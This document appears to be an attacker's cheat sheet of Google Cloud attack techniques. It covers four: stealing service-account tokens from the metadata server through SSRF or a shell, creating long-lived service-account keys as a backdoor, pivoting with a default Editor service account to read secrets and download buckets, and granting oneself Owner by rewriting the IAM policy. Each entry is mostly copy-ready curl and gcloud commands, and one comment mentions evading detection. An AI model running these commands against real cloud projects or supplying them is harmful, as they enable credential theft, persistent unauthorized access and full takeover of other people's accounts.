# Cloud – GCP Attacks

### GCP Metadata Server SSRF — Service Account Token Theft [added: 2026-04]
- **Tags:** #GCP #MetadataServer #SSRF #ServiceAccount #TokenTheft #ComputeEngine #CloudFunction #CloudCredTheft
- **Trigger:** Found SSRF vulnerability in a GCP-hosted application or have shell on a Compute Engine VM / Cloud Function / Cloud Run container
- **Prereq:** SSRF vulnerability or shell access on GCP resource + metadata server (169.254.169.254) reachable + `Metadata-Flavor: Google` header injectable (or shell access)
- **Yields:** OAuth2 access token for the attached service account, usable for GCP API calls with all roles granted to that SA
- **Opsec:** Low
- **Context:** GCP metadata server requires the `Metadata-Flavor: Google` header (unlike AWS IMDSv1). From shell access this is trivial. Via SSRF, you need header injection capability. The token grants access to all GCP APIs the service account is authorized for.
- **Payload/Method:**
  ```bash
  # From shell — get access token for the default service account
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq .

  # Enumerate the service account email
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

  # List all scopes the SA has
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"

  # Get project ID
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/project/project-id"

  # Check for custom metadata (startup scripts often contain secrets)
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true"

  # Use stolen token with gcloud
  gcloud auth activate-service-account --access-token="<STOLEN_TOKEN>"
  # Or use directly with curl
  curl -s -H "Authorization: Bearer <STOLEN_TOKEN>" \
    "https://cloudresourcemanager.googleapis.com/v1/projects" | jq .
  ```

### GCP Service Account Key Creation — Persistent Access [added: 2026-04]
- **Tags:** #GCP #ServiceAccountKey #IAM #PersistentAccess #PrivEsc #Backdoor #KeyCreation #ServiceAccount
- **Trigger:** Compromised GCP identity has `iam.serviceAccountKeys.create` permission on a high-privilege service account
- **Prereq:** Authenticated GCP session (gcloud or API) + `iam.serviceAccountKeys.create` permission on the target service account
- **Yields:** Downloaded JSON key file for the target service account — persistent credential that works until deleted, no token expiry
- **Opsec:** High
- **Context:** Service account keys are long-lived credentials (no automatic expiry). If you can create a key for a highly privileged SA, you get persistent access that survives token revocations and password resets. This is a common persistence and privilege escalation technique.
- **Payload/Method:**
  ```bash
  # List all service accounts in the project
  gcloud iam service-accounts list --project <PROJECT_ID>

  # Check IAM policy to find high-privilege SAs
  gcloud projects get-iam-policy <PROJECT_ID> --format=json \
    | jq '.bindings[] | select(.role | test("owner|admin|editor"; "i"))'

  # Create a new key for the target service account
  gcloud iam service-accounts keys create ./sa-key.json \
    --iam-account=<TARGET_SA_EMAIL> \
    --project=<PROJECT_ID>

  # Authenticate with the stolen key
  gcloud auth activate-service-account --key-file=./sa-key.json

  # Verify access
  gcloud projects list
  gcloud compute instances list --project <PROJECT_ID>

  # Or use via API directly
  export GOOGLE_APPLICATION_CREDENTIALS=./sa-key.json
  curl -s -H "Authorization: Bearer $(gcloud auth print-access-token)" \
    "https://cloudresourcemanager.googleapis.com/v1/projects" | jq .

  # Cleanup note: list keys to avoid detection
  gcloud iam service-accounts keys list --iam-account=<TARGET_SA_EMAIL>
  ```

### GCP Default Service Account Abuse — Editor Privesc from Compromised VM [added: 2026-04]
- **Tags:** #GCP #DefaultServiceAccount #ComputeEngine #Editor #PrivEsc #LateralMovement #ProjectEditor #VMEscape
- **Trigger:** Compromised a GCP Compute Engine VM and the default service account has the Editor role (common misconfiguration)
- **Prereq:** Shell on a Compute Engine VM + default service account attached + Editor role granted (or broad scopes like `cloud-platform`)
- **Yields:** Project-wide Editor access — read/write to Compute, Storage, BigQuery, Pub/Sub, and most GCP services in the project
- **Opsec:** Med
- **Context:** GCP Compute Engine VMs created with default settings often get the default compute service account with Editor role. Editor can read/write almost everything in the project. From a compromised VM, use the metadata token to pivot across the entire project.
- **Payload/Method:**
  ```bash
  # Confirm you're on a GCP VM with the default SA
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
  # Look for: <PROJECT_NUMBER>-compute@developer.gserviceaccount.com

  # Check scopes (need cloud-platform or broad scopes)
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"

  # Get access token and authenticate gcloud
  ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
    | jq -r .access_token)

  # Enumerate the project with Editor permissions
  gcloud compute instances list --project <PROJECT_ID>
  gcloud storage ls
  gcloud sql instances list --project <PROJECT_ID>
  gcloud secrets list --project <PROJECT_ID>

  # Read secrets (Editor has secretmanager.versions.access on many setups)
  gcloud secrets versions access latest --secret=<SECRET_NAME> --project <PROJECT_ID>

  # List and download storage buckets
  gsutil ls gs://<BUCKET_NAME>/
  gsutil cp gs://<BUCKET_NAME>/sensitive-file.txt ./

  # SSH to other VMs in the project (Editor can set SSH keys via metadata)
  gcloud compute ssh <OTHER_VM> --zone <ZONE> --project <PROJECT_ID>
  ```

### GCP IAM Policy Binding Escalation — Self-Grant Owner [added: 2026-04]
- **Tags:** #GCP #IAM #PolicyBinding #PrivEsc #setIamPolicy #Owner #ProjectTakeover #RoleBinding #ResourceManager
- **Trigger:** Compromised GCP identity has `resourcemanager.projects.setIamPolicy` or `setIamPolicy` on a folder/org and want to escalate to Owner
- **Prereq:** Authenticated GCP session + `resourcemanager.projects.setIamPolicy` (or equivalent at folder/org level) + knowledge of your own member identity (user/SA email)
- **Yields:** Owner role on the GCP project/folder/org, granting full administrative control over all resources
- **Opsec:** High
- **Context:** The `setIamPolicy` permission allows overwriting the entire IAM policy for a resource. This is the GCP equivalent of Azure User Access Administrator escalation. If any identity has this permission, it can grant itself (or any other identity) the Owner role.
- **Payload/Method:**
  ```bash
  # Check if current identity can set IAM policy
  # (no direct "test" — try to get the policy first)
  gcloud projects get-iam-policy <PROJECT_ID> --format=json > policy.json

  # Examine current policy
  cat policy.json | jq '.bindings[] | select(.role == "roles/owner")'

  # Add yourself as Owner — edit policy.json to add a new binding
  # Add this to the bindings array:
  # {"role": "roles/owner", "members": ["user:<YOUR_EMAIL>"]}
  
  # Using jq to modify the policy programmatically
  jq '.bindings += [{"role": "roles/owner", "members": ["serviceAccount:<YOUR_SA_EMAIL>"]}]' \
    policy.json > policy_modified.json

  # Apply the modified policy
  gcloud projects set-iam-policy <PROJECT_ID> policy_modified.json

  # Alternatively via REST API
  curl -s -X POST \
    -H "Authorization: Bearer $(gcloud auth print-access-token)" \
    -H "Content-Type: application/json" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/<PROJECT_ID>:setIamPolicy" \
    -d "{\"policy\": $(cat policy_modified.json)}"

  # Verify escalation
  gcloud projects get-iam-policy <PROJECT_ID> --flatten="bindings[].members" \
    --filter="bindings.members:<YOUR_SA_EMAIL>" --format="table(bindings.role)"
  ```
